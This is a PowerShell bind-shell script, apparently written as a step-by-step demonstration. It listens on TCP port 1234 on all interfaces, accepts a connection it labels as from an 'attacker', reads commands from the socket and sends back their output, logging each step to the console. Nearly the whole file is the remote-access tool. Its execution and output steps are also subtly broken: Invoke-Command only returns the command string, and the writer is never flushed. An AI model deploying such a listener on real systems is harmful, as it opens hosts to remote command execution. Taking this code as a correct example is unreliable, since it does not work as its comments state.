$port = 1234
$Ip = [System.Net.IPAddress]::Any

Write-Host "[*] Building socket..."
Write-Host "`$server = New-Object -TypeName System.Net.IPEndPoint ($Ip, $port)"
$server = New-Object -TypeName System.Net.IPEndPoint ($Ip, $port)    #Create a socket

Try{
    Write-Host "[*] Building TCP listener..."
    Write-Host "`$server = New-Object System.Net.Sockets.TcpListener $server -ErrorAction Stop"
    $server = New-Object System.Net.Sockets.TcpListener $server -ErrorAction Stop                                  #Bind a socket
    $server.start()                                                                                                #Start Listening
    Write-Host "[*] Starting listener..."
    Write-Host "$server.start()"
} Catch {
    $server.stop()
    Write-Host -f red $_.Exception.Message
    Write-Host -f red "ERROR: Could not bind to ${Ip}:$port"
    return
}

while ($true){

    Write-Host "[*] Listening for connection..."
    Write-Host "`$client = $server.AcceptTcpClient()"                      
    $client = $server.AcceptTcpClient()                                                      #Accept connection
    Write-Host "[*] Connection established from attacker"

    $stream = $client.GetStream()                                                        #Get raw data from stream
    Write-Host "`$stream = $client.GetStream()"
    Write-Host "[*] Got Stream"

    Write-Host "[*] Creating stream reader..."
    Write-Host "`$reader = New-Object System.IO.StreamReader $stream"
    $reader = New-Object System.IO.StreamReader $stream                              #Create a stream reader

    Write-Host "[*] Creating stream writer..."
    Write-Host "`$writer = New-Object System.IO.StreamWriter $stream"
    $writer = New-Object System.IO.StreamWriter $stream                              #Create a stream writer

    while ($true){

        Write-Host "[*] Reading stream..."
        Write-Host "`$cmd = $reader.ReadLine()"
        $cmd = $reader.ReadLine()                                                        #Read the command from stream

        if (($cmd) -and ($cmd -ne "exit")){

            Write-Host "[*] Running command: $cmd"
            Write-Host "`$cmdOutput = Invoke-Command {$cmd}"
            $cmdOutput = Invoke-Command {$cmd}                                                          #Execute the command and get output
            Write-Host "[*] Command Output:`n $cmdOutput"

            Write-Host "[*] Sending output to client..."
            Write-Host "`$cmdOutput = $writer.Write($cmdOutput)"
            $cmdOutput = $writer.Write($cmdOutput)                                           #Write cmd output to stream

        } else {
            Write-Host "[*] Disconnecting from client..."
            $stream.Dispose()
            $reader.Dispose()                                                                #Destroy reader
            $writer.Dispose()                                                                #Destroy writer
            $client.Dispose()                                                                #Dissconnect from client
            break                                                                            #Go back and listen for connection
        }
    }  
}
$server.stop()